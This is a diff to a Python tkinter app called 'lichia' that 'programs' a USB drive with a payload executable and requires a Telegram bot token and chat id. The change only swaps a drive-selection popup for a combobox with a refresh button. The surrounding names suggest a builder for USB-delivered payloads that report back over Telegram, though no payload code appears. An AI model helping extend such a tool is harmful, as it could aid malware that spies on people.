@@ -12,6 +12,7 @@ import urllib.request
 from pathlib import Path
 
 import tkinter as tk
+import tkinter.ttk as ttk
 from tkinter import messagebox, filedialog
 from tkinter.scrolledtext import ScrolledText
 
@@ -117,8 +118,22 @@ class App(tk.Tk):
         cb.grid(row=7, column=0, sticky="ew", pady=(0, 6), ipady=6)
 
 
+        tk.Label(inner, text="pendrive a programar", bg=CARD, fg=TEXT,
+                 font=FONT).grid(row=8, column=0, sticky="w", pady=(6, 2))
+        drvrow = tk.Frame(inner, bg=CARD)
+        drvrow.grid(row=9, column=0, sticky="ew", pady=(0, 6))
+        drvrow.columnconfigure(0, weight=1)
+        self.drive_cb = ttk.Combobox(drvrow, values=[], state="readonly",
+                                     font=FONT)
+        self.drive_cb.grid(row=0, column=0, sticky="ew", ipady=5)
+        tk.Button(drvrow, text="↻", command=self.refresh_drives,
+                  bg=CARD, fg=SKIN_D, relief="flat", font=FONT,
+                  cursor="hand2", width=3).grid(row=0, column=1,
+                                                 padx=(8, 0), ipady=6)
+
+
         btns = tk.Frame(inner, bg=CARD)
-        btns.grid(row=8, column=0, sticky="ew", pady=(12, 0))
+        btns.grid(row=10, column=0, sticky="ew", pady=(12, 0))
         btns.columnconfigure(0, weight=1)
 
         tk.Button(btns, text="●  programar pendrive",
@@ -152,6 +167,8 @@ class App(tk.Tk):
                                     insertbackground=TEXT)
         self.log_txt.pack(fill="both", expand=True, padx=12, pady=(0, 10))
 
+        self.refresh_drives()
+
 
 
 
@@ -175,30 +192,14 @@ class App(tk.Tk):
                 "modo": mode, "max_mb": max_mb}
 
 
-    def pick_drive(self):
+    def refresh_drives(self):
         drives = removable_drives()
-        if not drives:
-            messagebox.showerror("lichia", "nenhum pendrive detectado.")
-            return None
-        if len(drives) == 1:
-            return drives[0]
-        win = tk.Toplevel(self)
-        win.title("escolher pendrive")
-        win.configure(bg=BG)
-        win.grab_set()
-        chosen = {"d": None}
-        tk.Label(win, text="qual pendrive?", bg=BG, fg=TEXT,
-                 font=FONT).pack(padx=20, pady=(16, 6))
-        for d in drives:
-            tk.Button(win, text=d, bg=CARD, fg=SKIN_D,
-                      relief="flat", font=FONT, cursor="hand2",
-                      command=lambda dd=d: (chosen.__setitem__("d", dd),
-                                            win.destroy())
-                      ).pack(fill="x", padx=20, pady=3, ipady=6)
-        tk.Button(win, text="cancelar", bg=BG, fg=MUTED, relief="flat",
-                  font=SUB_F, command=win.destroy).pack(pady=(4, 14))
-        win.wait_window()
-        return chosen["d"]
+        self.drive_cb['values'] = drives
+        if drives:
+            if self.drive_cb.get() not in drives:
+                self.drive_cb.set(drives[0])
+        else:
+            self.drive_cb.set("")
 
 
     def find_payload_exe(self):
@@ -218,8 +219,16 @@ class App(tk.Tk):
         if not cfg["token"] or not cfg["chat_id"]:
             messagebox.showwarning("lichia", "preencha token e chat id.")
             return
-        drive = self.pick_drive()
+        drive = self.drive_cb.get().strip()
         if not drive:
+            self.refresh_drives()
+            messagebox.showerror("lichia",
+                "selecione o pendrive a programar na lista.")
+            return
+        if drive not in removable_drives():
+            self.refresh_drives()
+            messagebox.showerror("lichia",
+                "esse pendrive não está mais encaixado — atualizei a lista.")
             return
         exe = self.find_payload_exe()
         if not exe or not Path(exe).exists():
